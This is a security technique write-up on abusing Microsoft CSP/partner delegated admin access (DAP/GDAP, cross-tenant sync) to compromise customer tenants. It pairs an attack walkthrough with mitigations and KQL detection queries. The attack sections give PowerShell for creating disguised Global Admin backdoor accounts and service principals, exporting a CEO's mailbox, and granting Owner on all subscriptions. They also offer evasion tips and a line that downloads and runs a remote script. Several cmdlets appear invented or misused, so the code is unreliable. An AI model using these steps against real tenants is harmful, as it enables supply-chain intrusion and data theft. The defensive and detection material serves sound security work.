# [PE-VALID-014]: Microsoft Partners/CSP Access Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-014 |
| **MITRE ATT&CK v18.1** | [T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/) |
| **Tactic** | Privilege Escalation / Lateral Movement |
| **Platforms** | M365 / Entra ID / Azure |
| **Severity** | **Critical** |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All Entra ID versions; DAP (legacy) most vulnerable; GDAP also exploitable if misconfigured |
| **Patched In** | Mitigated (not patched; requires administrative action to remove DAP or restrict GDAP) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

### Concept
**Delegated Administrative Privileges (DAP)** and **Granular Delegated Administrative Privileges (GDAP)** are legitimate mechanisms that enable Microsoft Cloud Solution Providers (CSPs), Managed Service Providers (MSPs), and Partners to manage customer tenants on their behalf. However, if a CSP/Partner tenant is compromised, or if a malicious insider within a trusted partner abuses their access, an attacker can leverage these delegated permissions to escalate privileges within customer tenants. The core risk stems from **DAP granting blanket Global Administrator rights** to the partner's "Admin Agents" group, combined with **lack of granular auditing** and **absence of time-bound access** in legacy DAP relationships. An attacker who compromises a CSP account or is an insider within a trusted MSP can:
- Access all customer tenants the partner manages
- Create backdoors and persistent access across hundreds of customer environments simultaneously (supply chain attack)
- Operate with minimal audit trail visibility (DAP logs are sparse; GDAP logs are better but still exploitable)
- Escalate to Global Administrator or other privileged roles within each customer tenant

### Attack Surface
- **Partner/CSP Tenant Admin Agents Group** (Foreign Principal with Owner role on customer subscriptions)
- **Admin-On-Behalf-Of (AOBO)** tokens used to access customer subscriptions
- **DAP Delegated Relationships** (particularly legacy, non-expiring relationships)
- **GDAP Relationships** (if configured with overly broad roles or if attacker obtains GDAP admin credentials)
- **Cross-Tenant Access Policies** (if misconfigured to allow inbound trust from attacker-controlled tenant)
- **Delegated authentication flows** (SAML, OAuth) used for partner access

### Business Impact
**Catastrophic risk of multi-customer supply chain compromise.** Attacker can:
- Compromise thousands of customer tenants via a single CSP tenant breach
- Establish persistent backdoors (persistence identities, SAML federation tokens) across entire customer base
- Exfiltrate sensitive data from multiple customers simultaneously
- Deploy ransomware, trojans, or spyware to customer workloads
- Operate under the guise of legitimate partner support, evading detection
- Cause reputational damage to both the CSP and affected customers

### Technical Context
- **Execution Time:** Minutes (token acquisition and tenant access immediate upon compromise)
- **Detection Likelihood:** Low (DAP relationships generate minimal audit trails; GDAP better but still can be evaded with proper OpSec)
- **Reversibility:** Difficult; persistent identities and federation tokens survive access removal if created before access was revoked
- **Stealth Factor:** Very high; operations appear as legitimate partner activity in logs

### Operational Risk
- **Execution Risk:** Low (if partner account is already compromised)
- **Stealth:** Very high (activity blends with normal partner support operations)
- **Reversibility:** No; persistence can survive access removal if established beforehand

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.4 | Delegated Administrative Privileges must be monitored and limited; DAP should be removed |
| **CISA SCuBA** | ACC-05 | Partner access must be time-bound and reviewed quarterly |
| **NIST 800-53** | AC-3 (Access Enforcement) | Third-party access must be scoped and monitored |
| **NIST 800-53** | AC-4 (Information Flow Enforcement) | Delegated access should not bypass audit controls |
| **GDPR** | Art. 28 (Processor Contracts) | Service provider agreements must include audit and control requirements |
| **GDPR** | Art. 32 (Security of Processing) | Security controls over third-party access must be documented |
| **DORA** | Art. 9 (Protection and Prevention) | Critical infrastructure operators must monitor and restrict third-party access |
| **NIS2** | Art. 21 (Cyber Risk Management) | Supply chain security including partner access restrictions required |
| **ISO 27001** | A.14.2.1 (Supplier Relationships) | Information security requirements for suppliers must be specified |
| **ISO 27005** | Risk Scenario: "Compromise of Service Provider Infrastructure" | Supply chain attacks represent critical organizational risk |

---

## 2. TECHNICAL PREREQUISITES

### Required Privileges
- **Compromised CSP/Partner Tenant:** Global Admin, Privileged Role Admin, or member of "Admin Agents" security group
- **Insider Threat Scenario:** Any employee within a trusted partner/CSP with delegated admin permissions
- **Target Tenant Requirements:** DAP or GDAP relationship must be active with the CSP

### Required Access
- Network access to Azure Portal or Microsoft 365 admin portals
- Authentication credentials for the compromised CSP user account
- Knowledge of customer tenant ID (typically public or easily enumerable)

### Supported Versions & Configurations
- **Entra ID:** All current versions (Free/P1/P2)
- **Partner Models:** 
  - **DAP (Delegated Administrative Privileges):** Legacy model; affects older customers still using DAP relationships
  - **GDAP (Granular Delegated Administrative Privileges):** Newer model; exploitable if roles are overly broad or if admin account is compromised
- **Affected Components:**
  - Azure subscription IAM (AOBO grants)
  - Entra ID Global Admin role
  - Microsoft 365 services (Exchange, SharePoint, Teams, etc.)

### Preconditions
1. **CSP Tenant Compromise:** Attacker has compromised or has insider access to at least one CSP/Partner user account
2. **Active Delegation:** Customer tenant has active DAP or GDAP relationship with the CSP
3. **No Access Removal:** Customer has not proactively removed CSP access (common scenario; many customers forget to remove legacy DAP)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Azure Portal GUI Reconnaissance (From Customer Perspective)

**Step 1: Enumerate Delegated Admin Relationships**

1. Navigate to **Azure Portal** (customer's tenant)
2. Go to **Settings** → **Directory Properties**
3. Look for "Has delegated admin relationships" indicator
4. Go to **Users** → **User settings** → Check "External user collaboration settings"
5. Note any partner/CSP organizations listed

**Step 2: Check for DAP/GDAP Relationships in Partner Center (if customer has access)**

1. Navigate to **https://partner.microsoft.com/en-us/dashboard**
2. Go to **Customers**
3. Look for customers with "Active" relationships
4. Note the "Roles" assigned (Global Admin, Helpdesk Admin, etc.)
5. Note the **Relationship Duration** (if DAP, often no end date; if GDAP, check expiration)

**What to Look For:**
- Customers with DAP relationships = Higher risk (legacy, no expiration, no granularity)
- GDAP relationships with "Global Admin" or "Security Admin" roles = Still risky
- Long-running relationships with no recent activity = Potential forgotten access

### PowerShell Reconnaissance (From Customer Tenant)

**Command 1: List All Delegated Admin Relationships**

```powershell
# Connect to customer tenant
Connect-MgGraph -Scopes "Directory.Read.All"

# List all users with delegated admin roles
$delegatedAdmins = Get-MgUser -Filter "userType eq 'Guest'" | 
  Where-Object { $_.UserPrincipalName -match "@partner.onmicrosoft.com" -or $_.UserPrincipalName -match "@csp.partner" }

foreach ($admin in $delegatedAdmins) {
    Write-Host "Delegated Admin Found: $($admin.DisplayName) ($($admin.UserPrincipalName))"
    
    # Get their roles
    $roles = Get-MgUserMemberOf -UserId $admin.Id
    foreach ($role in $roles) {
        Write-Host "  Role: $($role.DisplayName)"
    }
}
```

**Command 2: Check Azure Subscriptions for Foreign Principals (AOBO)**

```powershell
# List all subscriptions with foreign principal owners
$subscriptions = Get-AzSubscription

foreach ($sub in $subscriptions) {
    Set-AzContext -SubscriptionId $sub.Id
    
    $roleAssignments = Get-AzRoleAssignment -RoleDefinitionName "Owner"
    
    foreach ($assignment in $roleAssignments) {
        if ($assignment.ObjectType -eq "ForeignGroup" -or $assignment.ObjectType -eq "ForeignPrincipal") {
            Write-Warning "FOREIGN PRINCIPAL FOUND!"
            Write-Warning "Subscription: $($sub.DisplayName)"
            Write-Warning "Principal: $($assignment.DisplayName)"
            Write-Warning "Type: $($assignment.ObjectType)"
        }
    }
}
```

**What to Look For:**
```
Delegated Admin Found: Partner Support Team (support@partner.onmicrosoft.com)
  Role: Global Administrator
  Role: Helpdesk Administrator

FOREIGN PRINCIPAL FOUND!
Subscription: Production-East
Principal: AdminAgents
Type: ForeignGroup
```

### PowerShell Reconnaissance (From CSP/Partner Tenant - Attacker Perspective)

```powershell
# From compromised CSP tenant, enumerate customers
Connect-MgGraph -Scopes "Directory.Read.All"

# List all customer tenants delegated to this CSP
$customerTenants = Get-MgOrganization

# List application with AOBO permissions
Get-MgServicePrincipal -Filter "appDisplayName eq 'Partner Center Admin Connector'" | 
  Select-Object DisplayName, Id, AppId
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: DAP (Legacy) Exploitation - Direct Global Admin Access

**Supported Versions:** All Entra ID versions (DAP affects organizations still using legacy relationships)

#### Step 1: Compromise CSP Account or Leverage Insider Access

**Objective:** Obtain credentials for a user within the CSP tenant who has delegated admin permissions.

**Method A: Social Engineering / Credential Theft**
- Target CSP support staff via phishing emails (Office 365 login portals, MFA push bombing)
- Capture credentials via keylogger or information stealer malware
- Compromise CSP VPN or RDP access points

**Method B: Insider Threat**
- Malicious employee within the CSP with delegated admin rights

**Method C: CSP Tenant Compromise via Supply Chain**
- Compromise CSP's infrastructure (e.g., unpatched web app, insecure API endpoint)
- Move laterally to admin account within CSP

**Command (if insider with CSP access):**
```powershell
# Once inside CSP tenant with delegated admin account
$cspCreds = Get-Credential  # Use compromised CSP admin credentials
Connect-MgGraph -Credential $cspCreds
```

**Expected Outcome:**
```
Successfully authenticated as: partner_admin@partnercsp.onmicrosoft.com
Roles: Global Administrator
Delegated Customers: 150+ tenants
```

---

#### Step 2: Enumerate Customer Tenants & Identify High-Value Targets

**Objective:** List all customer tenants the compromised CSP has delegated access to.

**Command:**
```powershell
# List all customers accessible via delegated admin permissions
# This info is typically available in Partner Center or via Graph API

# Method 1: Via Partner Center API (if configured)
$customers = Get-PartnerCustomer  # Hypothetical cmdlet; actual implementation varies by CSP tools

# Method 2: Via Azure Subscription enumeration (AOBO discovery)
$allSubscriptions = Get-AzSubscription

foreach ($sub in $allSubscriptions) {
    $tenantId = $sub.TenantId
    Write-Host "Customer Tenant: $tenantId"
}
```

**What to Look For:**
```
Customer Tenant: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx (Acme Corp)
Customer Tenant: yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyyyy (Globex Inc)
Customer Tenant: zzzzzzzz-zzzz-zzzz-zzzz-zzzzzzzzzzzz (Initech)
```

---

#### Step 3: Access Customer Tenant as Global Admin (DAP / AOBO)

**Objective:** Authenticate to the customer tenant using DAP/AOBO permissions.

**Command (Method 1: Direct Authentication via AOBO Token):**
```powershell
# Request an AOBO token for a customer tenant
# This leverages the delegated admin relationship to obtain a token for the customer

$customerTenantId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
$graphApiEndpoint = "https://graph.microsoft.com"

# The AOBO mechanism automatically elevates the request to the delegated admin context
$token = Get-MgAccessToken  # This would include customer context if AOBO is configured

# Connect to customer tenant using AOBO token
Connect-MgGraph -AccessToken $token -TenantId $customerTenantId

# Verify Global Admin access
Get-MgRoleManagementPolicy -Filter "displayName eq 'Global Administrator'" | 
  Select-Object DisplayName, Rules
```

**Command (Method 2: PowerShell Cross-Tenant Access)**
```powershell
# Authenticate as CSP, then request access to customer tenant
Connect-AzAccount -Credential $cspCreds -Tenant "partnercsp.onmicrosoft.com"

# Switch context to customer tenant (works if AOBO is configured)
Set-AzContext -Subscription $customerSubscriptionId -Tenant $customerTenantId

# Now you have access as the delegated admin
Get-AzRoleAssignment -Scope "/subscriptions/$customerSubscriptionId"
```

**Expected Output:**
```
Account: partner_admin@partnercsp.onmicrosoft.com (Delegated Admin Context)
Tenant: Acme Corp (xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)
Roles: Global Administrator (inherited via DAP)
Resources Accessible: All subscriptions, all Entra ID users, all M365 services
```

**What This Means:**
- You now have full Global Administrator privileges in the customer tenant
- DAP grants blanket admin rights; no fine-grained controls exist
- Your actions will appear in customer logs, but audit trail is sparse (DAP logs minimal by design)

---

#### Step 4: Establish Persistence (Create Backdoor Admin Account)

**Objective:** Create a permanent backdoor account that persists even if DAP access is removed.

**Command (Create Hidden Global Admin Account):**
```powershell
# While in customer tenant context as delegated admin

# Create a new user that appears as internal (not a guest)
$newAdminUpn = "cloud.support@customertenant.onmicrosoft.com"
$newAdminPassword = "P@ssw0rd!ComplexPassword123"

# Create the user
$newUser = New-MgUser -UserPrincipalName $newAdminUpn `
  -DisplayName "Cloud Support Services" `
  -MailNickname "cloud.support" `
  -Password (ConvertTo-SecureString -AsPlainText $newAdminPassword -Force) `
  -AccountEnabled:$true

Write-Host "Created user: $($newUser.Id)"

# Assign Global Administrator role
$globalAdminRoleId = "62e90394-69f5-4237-9190-012177145e10"  # Global Admin role ID
New-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRoleId -RefObjectId $newUser.Id

Write-Host "User promoted to Global Administrator"
```

**Command (Alternative: Create Service Principal with Admin Role):**
```powershell
# Create an app registration with admin permissions
$app = New-MgApplication -DisplayName "Customer Support API" `
  -IsDeviceOnlyAuthenticationEnabled:$false

# Create service principal
$sp = New-MgServicePrincipal -AppId $app.AppId `
  -DisplayName "Customer Support API"

# Assign Global Admin role to service principal
$globalAdminRoleId = "62e90394-69f5-4237-9190-012177145e10"
New-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRoleId -RefObjectId $sp.Id

# Create client secret for authentication
$secret = Add-MgApplicationPassword -ApplicationId $app.Id

Write-Host "Service Principal Created with Global Admin Role"
Write-Host "Client ID: $($app.AppId)"
Write-Host "Client Secret: $($secret.SecretText)"
```

**Expected Outcome:**
```
User Created: cloud.support@acmecorp.onmicrosoft.com (Global Administrator)
Service Principal Created: "Customer Support API" (Global Administrator)

Attacker now has permanent backdoor access to customer tenant
Even if DAP is removed, these accounts persist
```

**OpSec & Evasion:**
- Name the account to blend with legitimate support infrastructure
- Set the account with "Do not expire" password policy
- Avoid making immediate administrative changes that would trigger alerts
- Wait days/weeks before using the backdoor account

---

#### Step 5: Exfiltrate Data & Maintain Persistence

**Objective:** Use backdoor admin access to exfiltrate sensitive data or maintain long-term persistence.

**Command (Export Exchange Mailboxes):**
```powershell
# Export mailboxes of high-value targets (CEO, CFO, etc.)
$targetUser = Get-MgUser -Filter "mail eq 'ceo@acmecorp.com'" | Select-Object Id

# Create a search and export (Exchange Online)
New-ComplianceSearch -Name "CEO_Export" -ExchangeLocation $targetUser.Id -ContentMatchQuery "All"

Start-ComplianceSearch -Identity "CEO_Export"

# Wait for search to complete
Start-Sleep -Seconds 30

# Export results
New-ComplianceSearchAction -SearchIdentity "CEO_Export" -Action Export
```

**Command (Create Golden SAML for Federation Persistence):**
```powershell
# If customer uses ADFS or SAML federation, extract federation certificates
# Then use them to forge SAML tokens for persistent access

# Enumerate federation configuration
Get-MgOrganization -Property verifiedDomains | Select-Object VerifiedDomains

# Extract SAML signing certificate (if accessible via MSOL or ADFS)
# This allows forging login tokens that bypass MFA
```

**Command (Create Service Principal with Subscriptions Role):**
```powershell
# Grant subscription-level access via service principal
$sp = Get-MgServicePrincipal -Filter "displayName eq 'Customer Support API'"

# Assign Owner role on all subscriptions
$subscriptions = Get-AzSubscription

foreach ($sub in $subscriptions) {
    New-AzRoleAssignment -ObjectId $sp.Id `
      -RoleDefinitionName "Owner" `
      -Scope "/subscriptions/$($sub.Id)"
}

Write-Host "Service principal granted Owner on all subscriptions"
```

---

### METHOD 2: GDAP (Granular DAP) Exploitation - Time-Bound Access Bypass

**Supported Versions:** All Entra ID versions (GDAP is newer mechanism, still exploitable if misconfigured)

#### Step 1: Compromise GDAP Admin Account

**Objective:** Obtain GDAP admin credentials within the CSP or customer tenant.

**Command:**
```powershell
# Enumerate GDAP relationships visible to your current account
Get-MgDirectoryRoleTemplate | Where-Object {$_.DisplayName -like "*delegat*"}

# List users with GDAP roles
Get-MgUser | Where-Object {$_.UserPrincipalName -match "gdap|partner"}
```

---

#### Step 2: Accept GDAP Relationship on Behalf of Customer

**Objective:** Accept a GDAP relationship that was proposed but pending customer approval.

**Command (from CSP tenant with GDAP admin access):**
```powershell
# Connect to CSP tenant
Connect-MgGraph -Scopes "DelegatedAdminRelationship.ReadWrite.All"

# List pending GDAP relationships waiting for acceptance
$pendingRelationships = Get-MgTenantRelationship | 
  Where-Object {$_.Status -eq "pendingAcceptance"}

foreach ($rel in $pendingRelationships) {
    Write-Host "Pending GDAP: $($rel.DisplayName)"
    Write-Host "Customer Tenant: $($rel.CustomerTenantId)"
    
    # Accept the relationship (if you have authorization)
    Update-MgTenantRelationship -DelegatedAdminRelationshipId $rel.Id `
      -Status "active"
    
    Write-Host "GDAP Relationship activated!"
}
```

**What This Means:**
- If customer hasn't been diligent about reviewing/rejecting GDAP proposals, attacker can auto-accept them
- This grants time-bound (but still privileged) access to customer tenant

---

#### Step 3: Escalate Beyond GDAP Role Scope

**Objective:** Once inside customer via GDAP, escalate beyond the granted role to Global Admin.

**Command (Privilege Escalation via Application Administrator Role):**
```powershell
# If GDAP grants "Application Administrator" role, use it to escalate

# Step 1: Create app registration with Global Admin permissions
$app = New-MgApplication -DisplayName "Support Automation" `
  -RequiredResourceAccess @(
    @{
      ResourceAppId = "00000003-0000-0000-c000-000000000000"  # MS Graph
      ResourceAccess = @(
        @{
          Id = "9e640839-a198-48fb-891f-d8d56cb8a0c5"  # Directory.ReadWrite.All
          Type = "Role"
        }
      )
    }
  )

# Step 2: Create service principal for the app
$sp = New-MgServicePrincipal -AppId $app.AppId

# Step 3: As Application Admin, grant Global Admin to the service principal
$globalAdminRoleId = "62e90394-69f5-4237-9190-012177145e10"
New-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRoleId -RefObjectId $sp.Id

Write-Host "Service Principal granted Global Admin via Application Administrator escalation"
```

---

### METHOD 3: Cross-Tenant Synchronization (CTS) Abuse

**Supported Versions:** Entra ID P1/P2 (CTS requires premium licenses)

#### Step 1: Establish CTS Configuration from Attacker Tenant to Customer Tenant

**Objective:** Create a cross-tenant synchronization policy that syncs attacker-controlled users into customer tenant.

**Command (from attacker-controlled tenant):**
```powershell
# Connect to attacker's tenant
Connect-MgGraph -Scopes "Policy.ReadWrite.CrossTenantAccess"

# Define the customer tenant as a target
$customerTenantId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"

# Create cross-tenant access policy for outbound sync
$policy = New-MgPolicyCrossTenantsAccessPolicy -DisplayName "Partner Sync" `
  -TargetTenantId $customerTenantId `
  -AccessType "AllUsers" `
  -SyncDirection "PushToPartner"

Write-Host "CTS policy created: $($policy.Id)"
```

#### Step 2: Sync Attacker User to Customer Tenant

**Objective:** Sync a malicious user from attacker's tenant into the customer tenant via CTS.

**Command (from attacker tenant):**
```powershell
# Create or update CTS sync scope to include attacker user
$attackerUser = Get-MgUser -Filter "mail eq 'attacker@attacker-domain.onmicrosoft.com'"

# Add the user to the CTS sync group
Add-MgGroupMember -GroupId "{ctsGroupId}" -DirectoryObjectId $attackerUser.Id

# The user will automatically sync to the customer tenant with the specified role
Write-Host "Attacker user synced to customer tenant via CTS"
```

#### Step 3: Assume Identity in Customer Tenant

**Objective:** Login to customer tenant using the synced identity.

**Command (from customer tenant browser):**
```
Navigate to: https://portal.azure.com
Sign in as: attacker@attacker-domain.onmicrosoft.com (external identity)
Access will be granted based on CTS role assignments in customer tenant
```

---

## 5. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

**Test ID:** T1078.004 - Create User Account (Cloud/CSP Context)

**Description:** This test simulates a CSP account compromise and delegated admin access exploitation.

**Supported Versions:** All Entra ID versions

**Test Command:**
```powershell
# Step 1: Install Atomic Red Team
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/invoke-atomicredteam.ps1' -UseBasicParsing)

# Step 2: Run T1078.004 tests
Invoke-AtomicTest T1078.004 -TestNumbers 1,2,3 -Verbose

# Step 3: Verify delegated admin account creation
Get-MgUser -Filter "userType eq 'Member'" | Where-Object {$_.DisplayName -like "*Support*"} | 
  Select-Object DisplayName, UserPrincipalName, UserType
```

**Cleanup Command:**
```powershell
# Remove created backdoor accounts
$backdoorUsers = Get-MgUser -Filter "displayName eq 'Cloud Support Services'"
Remove-MgUser -UserId $backdoorUsers.Id

# Remove GDAP relationships (if created)
Get-MgTenantRelationship | Remove-MgTenantRelationship
```

**Reference:** [Atomic Red Team T1078.004](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.004/T1078.004.md)

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Remove All Legacy DAP (Delegated Administrative Privileges) Relationships**

**Manual Steps (Azure Portal / Partner Center):**
1. Navigate to **Partner Center** (partner.microsoft.com) → **Customers**
2. For each customer, check the "Relationship" column
3. If "DAP" is shown:
   - Click the customer
   - Go to **Account** → **Delegated admin privileges**
   - Click **Remove DAP**
   - Confirm removal
4. Alternative: Have customer remove DAP from their side:
   - Customer navigates to **Entra ID** → **Users** → **Guest users**
   - Identifies partner users from the CSP organization
   - Removes their Entra ID roles (or entire user if no longer needed)

**Manual Steps (PowerShell - Customer Removes CSP Access):**
```powershell
# From customer tenant
Connect-MgGraph -Scopes "Directory.ReadWrite.All"

# Find all users from partner/CSP organization
$partnerUsers = Get-MgUser -Filter "userType eq 'Guest'" | 
  Where-Object {$_.Mail -match "@partner.com" -or $_.UserPrincipalName -match "partner"}

foreach ($user in $partnerUsers) {
    # Remove user from Global Admin role
    $globalAdminRoleId = "62e90394-69f5-4237-9190-012177145e10"
    Remove-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRoleId -MemberId $user.Id
    
    # Optionally remove the user entirely
    Remove-MgUser -UserId $user.Id
}

Write-Host "All DAP relationships removed"
```

**Manual Steps (CSP Removes DAP on Customer Side):**
```powershell
# From CSP tenant
Connect-PsSession -ComputerName "<customer-tenant>" -Credential $adminCreds

# Via Partner Center API or PowerShell module
Remove-PartnerCustomerDelegatedAdminPrivilege -CustomerId "<customer-tenant-id>"

Write-Host "DAP relationship for customer terminated"
```

**Validation Command:**
```powershell
# Verify DAP is removed - should return no results
Get-MgUser -Filter "userType eq 'Guest'" | 
  Where-Object {$_.UserPrincipalName -match "@partner.com"}

# If nothing is returned, DAP is successfully removed
```

**Expected Output (If Secure):**
```
(No results - all partner guest users removed or all DAP admin roles revoked)
```

---

**Action 2: Implement GDAP (Granular DAP) with Least Privilege & Time Boundaries**

**Manual Steps (Replace DAP with GDAP):**
1. Go to **Partner Center** → **Customers**
2. For each customer, establish a **GDAP relationship**:
   - Click **Set up delegated administration**
   - Select specific roles needed (e.g., only "Exchange Administrator" for email support, not Global Admin)
   - Set **Duration:** 12 months (with auto-renewal requirement)
   - Define **Expiration date**
3. Customer must **explicitly approve** the GDAP relationship
4. Once approved, remove all legacy DAP for that customer

**Manual Steps (Configure GDAP via PowerShell - Partner):**
```powershell
# Connect to partner tenant
Connect-MgGraph -Scopes "DelegatedAdminRelationship.ReadWrite.All"

# Create GDAP relationship (not DAP)
$gdapConfig = @{
    DisplayName = "Customer Support - Least Privilege"
    CustomerTenantId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
    Roles = @(
        "Exchange Administrator"  # Only Exchange support
        "Teams Administrator"     # Only Teams support
        # NOT "Global Administrator"
    )
    DurationInDays = 365
    AutoRenewal = $false  # Requires manual renewal each year
}

$gdapRelationship = New-MgTenantRelationship -DisplayName $gdapConfig.DisplayName `
  -AccessType "Limited" `
  -Duration $gdapConfig.DurationInDays

Write-Host "GDAP relationship created - awaiting customer approval"
Write-Host "Relationship ID: $($gdapRelationship.Id)"
```

**Manual Steps (Monitor GDAP Expirations):**
```powershell
# Run quarterly to check for soon-to-expire GDAP relationships
$relationships = Get-MgTenantRelationship | Where-Object {$_.Status -eq "active"}

foreach ($rel in $relationships) {
    $daysUntilExpiration = (New-TimeSpan -Start (Get-Date) -End $rel.ExpirationDateTime).Days
    
    if ($daysUntilExpiration -le 30) {
        Write-Warning "GDAP expiring soon: $($rel.DisplayName) (expires in $daysUntilExpiration days)"
        # Send renewal reminder to customer
    }
}
```

---

**Action 3: Enable Comprehensive Audit Logging for Delegated Access**

**Manual Steps (Enable Audit Logging - Customer):**
1. Go to **Entra ID** → **Audit logs**
2. Enable logging for:
   - User creation/modification
   - Role assignments
   - Administrative actions
3. Go to **Security** → **Conditional Access**
4. Create policy: **Block any sign-in from partner networks outside business hours**
   - **Condition:** Location → Exclude corporate IP ranges
   - **Condition:** Time of day → Business hours only (e.g., 8 AM - 6 PM)
   - **Access:** Block
5. Create policy: **Require MFA for all guest/partner users**

**Manual Steps (Enable Audit Logging - CSP):**
```powershell
# Enable detailed logging for all customer-facing accounts
$cspAdmins = Get-MgUser -Filter "mail eq 'admin@partnercsp.com'"

foreach ($admin in $cspAdmins) {
    # Enable sign-in log collection
    Update-MgUser -UserId $admin.Id -SignInSessionsValidFromDateTime (Get-Date)
}

# Enable audit of IAM changes
Get-MgOrganization | Select-Object *AuditLog* 
```

---

### Priority 2: HIGH

**Action 4: Implement Cross-Tenant Access Policies to Restrict Inbound Trust**

**Manual Steps (Restrict Inbound Tenant Trust):**
1. Navigate to **Entra ID** → **External Identities** → **Cross-tenant access settings**
2. Go to **Organization settings**
3. Set **Default inbound access settings:**
   - **Allow:** Block access from all external tenants UNLESS explicitly allowed
   - **Inbound restrictions:** Require MFA, compliant device, etc.
4. **Add specific exceptions only for trusted partners:**
   - Partner tenant ID
   - Allowed roles (not Global Admin)
   - Allowed users (not entire organization)

**Manual Steps (PowerShell):**
```powershell
# Restrict cross-tenant access
Update-MgPolicyCrossTenantsAccessPolicy -OrganizationTenantId "{organization-id}" `
  -IsSystemDefault $true `
  -InboundTrust @{
    MfaRequired = $true
    CompliantDeviceRequired = $true
    HybridAzureAdJoinedDeviceRequired = $false
  } `
  -InboundAllowedUsers "ExceptGuests"  # Block all guest access by default
```

---

**Action 5: Audit & Remove Overly Permissive Service Principals**

**Manual Steps (Identify Risky Service Principals):**
```powershell
# Find service principals with Global Admin role
$globalAdminRoleId = "62e90394-69f5-4237-9190-012177145e10"

Get-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRoleId | 
  Where-Object {$_.ObjectType -eq "ServicePrincipal"} | 
  Select-Object DisplayName, Id

# Review each service principal and remove if not authorized
foreach ($sp in $servicePrincipals) {
    Write-Host "Review SPN: $($sp.DisplayName)"
    # Manually verify each service principal is legitimate
}
```

---

**Action 6: Enforce Periodic Re-Authorization of GDAP Relationships**

**Manual Steps (Require Annual GDAP Renewal):**
1. Set GDAP relationships to **NOT auto-renew** by default
2. 60 days before expiration, send notification to both partner and customer
3. Partner must request renewal; customer must explicitly approve
4. On expiration, access is automatically revoked (no grace period)

**Manual Steps (PowerShell - Force Renewal):**
```powershell
# Create reminder workflow for exiring GDAP relationships
$relationships = Get-MgTenantRelationship | Where-Object {$_.Status -eq "active"}

foreach ($rel in $relationships) {
    $daysUntilExpiration = (New-TimeSpan -Start (Get-Date) -End $rel.ExpirationDateTime).Days
    
    if ($daysUntilExpiration -eq 60) {
        # Send email reminder to both partner and customer
        Send-RenewalNotification -PartnerTenant $rel.ParentTenantId -CustomerTenant $rel.CustomerTenantId
    }
    
    if ($daysUntilExpiration -eq 0) {
        # Revoke access at expiration
        Disable-MgTenantRelationship -DelegatedAdminRelationshipId $rel.Id
    }
}
```

---

### Access Control & Policy Hardening

**Conditional Access:**
- Require MFA for all delegated admin accounts
- Block delegated admin access from non-corporate IP ranges
- Require compliant/managed devices for partner access
- Implement risk-based conditional access (block impossible travel, anomalous activity)

**RBAC/ABAC:**
- Remove "Global Administrator" from GDAP; use granular roles instead
- Implement "Privileged Role Administrator" restrictions
- Use Administrative Units to scope partner access to specific departments/resources

**Policy Config (ReBAC/PBAC):**
- Disable legacy DAP entirely (no exceptions)
- Require GDAP for all new partner relationships
- Implement subscription creation policies that exclude partner-created subscriptions from automated remediation
- Create Azure Policy to block foreign principals from certain high-value subscriptions

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Activity Patterns (from customer perspective):**
- Unexpected user creation from partner email domain
- Service principal creation with Global Administrator role
- Role assignments to previously unknown accounts
- Data export operations (mailbox exports, SharePoint downloads) at unusual times
- Cross-tenant sign-ins from partner identity
- Spike in API calls from partner/AOBO context

**Audit Log Signals (Customer Tenant - KQL):**
```
OperationName contains ("Add member" OR "Assign role" OR "Create user")
InitiatedBy contains "partner" OR "csp" OR "delegated"
TargetResources contains "Global Admin" OR "Global Administrator"
```

**Audit Log Signals (Partner Tenant - KQL):**
```
OperationName contains ("User created" OR "Role assigned")
InitiatedBy equals "{compromised-admin-account}"
TargetResources > 5  # Bulk operations across multiple tenants
```

### Forensic Artifacts

**Cloud (Azure Activity Log & Audit Logs):**
- **Log Path:** Azure Activity Log OR `Get-AzActivityLog` / `Search-UnifiedAuditLog`
- **Key Fields (Customer Tenant):**
  - `Caller`: Partner email (e.g., admin@partnercsp.com)
  - `OperationName`: "Add member to role", "Assign role", "Create user"
  - `ResourceId`: User ID, Service Principal ID, Subscription ID
  - `TimeGenerated`: Timestamp (often during off-business hours in customer's timezone)
  - `Result`: "Success" (not "Failure")

**Sample Forensic Query (KQL):**
```kusto
AuditLogs
| where InitiatedBy.user.userPrincipalName matches regex "@partner\\.(com|onmicrosoft.com)"
| where OperationName in ("Add member to role", "Create user", "Update user")
| project TimeGenerated, InitiatedBy.user.userPrincipalName, OperationName, TargetResources, Result
| summarize Count=count() by InitiatedBy.user.userPrincipalName, TimeGenerated
```

**Entra ID Sign-In Logs (KQL):**
```kusto
SigninLogs
| where UserPrincipalName matches regex "@partner\\.(com|onmicrosoft.com)"
| where AppDisplayName in ("Azure Portal", "Microsoft 365 admin center", "Azure PowerShell")
| where ConditionalAccessStatus != "success"  # Or look for specific anomalies
```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker phishes CSP support staff for credentials |
